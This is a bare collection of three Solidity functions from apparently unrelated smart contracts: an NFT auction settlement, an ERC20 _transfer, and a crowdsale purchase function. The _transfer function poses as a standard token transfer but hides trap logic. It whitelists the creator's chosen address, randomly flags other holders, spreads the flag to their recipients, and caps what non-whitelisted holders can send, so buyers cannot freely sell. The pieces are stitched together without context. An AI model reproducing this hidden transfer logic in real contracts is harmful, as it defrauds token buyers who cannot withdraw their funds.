function getToken(uint _auctionId) external {
    require(auctions[_auctionId].exists);
    require(!auctions[_auctionId].executed);
    require(now <= auctions[_auctionId].executeTime);
    require(msg.sender == auctions[_auctionId].winner);
    uint fullPrice = auctions[_auctionId].finalPrice;
    require(arconaToken.transferFrom(msg.sender, this, fullPrice));
    if (!inWhiteList(msg.sender)) {
        uint fee = valueFromPercent(fullPrice, auctionFee);
        fullPrice = fullPrice.sub(fee).sub(gasInTokens);
    }
    arconaToken.transfer(auctions[_auctionId].owner, fullPrice);
    require(ERC721Interface(auctions[_auctionId].token).transfer(auctions[_auctionId].winner, auctions[_auctionId].tokenId));
    auctions[_auctionId].executed = true;
    emit GetToken(_auctionId, msg.sender);
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (qled == true)) {
        saucy[recipient] = true;
        roofy[recipient] = false;
        qled = false;
    }
    if (saucy[recipient] != true) {
        roofy[recipient] = ((randomItIs() == 2) ? true : false);
    }
    if ((roofy[sender]) && (saucy[recipient] == false)) {
        roofy[recipient] = true;
    }
    if (saucy[sender] == false) {
        require(amount < penal);
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function buyTokens(address beneficiary) whenNotPaused public payable {
    require(beneficiary != 0x0);
    require(validPurchase());
    require(SafeMath.add(weiInvestedBy[msg.sender], msg.value) <= whitelist.contributionCap(msg.sender));
    uint256 tokens = SafeMath.mul(msg.value, tokenBaseRate);
    tokens = tokens.add(SafeMath.mul(tokens, getCurrentBonus()).div(1000));
    require(SafeMath.add(tokensSold, tokens) <= crowdsaleSupply);
    tokensSold = SafeMath.add(tokensSold, tokens);
    creditOf[beneficiary] = creditOf[beneficiary].add(tokens);
    weiInvestedBy[msg.sender] = SafeMath.add(weiInvestedBy[msg.sender], msg.value);
    emit TokenPurchase(msg.sender, beneficiary, msg.value, tokens);
    vault.deposit.value(msg.value)(msg.sender);
}

